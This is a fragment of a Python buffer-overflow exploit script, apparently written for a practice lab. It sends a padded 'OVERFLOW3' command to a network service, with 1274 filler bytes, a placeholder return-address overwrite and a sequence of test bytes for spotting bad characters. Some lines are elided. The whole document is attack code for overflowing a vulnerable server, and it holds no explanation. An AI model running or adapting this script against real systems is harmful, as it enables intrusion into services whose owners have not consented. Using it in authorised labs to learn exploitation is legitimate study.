...
buffer='A'*1274
eip='B'*4
bad_char=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
...
try:
	...
	s.recv(1024)			
	s.send('OVERFLOW3 ' + buffer + eip + bad_char + '\r\n')
except:
